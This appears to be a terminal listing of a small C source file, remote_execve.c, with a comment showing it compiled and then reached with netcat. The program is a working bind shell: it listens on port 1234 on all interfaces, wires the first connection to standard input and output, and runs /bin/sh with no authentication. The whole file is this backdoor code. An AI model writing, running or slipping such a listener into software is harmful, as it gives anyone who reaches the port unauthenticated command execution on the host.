SERVER# cat remote_execve.c
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
/*
SERVER# gcc -o remote_execve remote_execve.c
SERVER# ./remote_execve
CLIENT# nc 127.0.0.1 1234
hostname
SERVER
exit
CLIENT#
*/


int main(){
        char *shell[2];
        int cfd,i,sockfd;
        struct sockaddr_in sin;

        sockfd=socket(AF_INET,SOCK_STREAM,0);
        sin.sin_family=AF_INET;
        sin.sin_addr.s_addr=0;
        sin.sin_port=htons(1234);
        bind(sockfd,(struct sockaddr *)&sin,sizeof(struct sockaddr_in));
        listen(sockfd,128); // cat /proc/sys/net/core/somaxconn
        cfd=accept(sockfd,NULL,0);
        for(i=0;i<3;i++){
                dup2(cfd,i);
        }
        shell[0]="/bin/sh";
        shell[1]=0;
        execve("/bin/sh",shell,NULL);
}
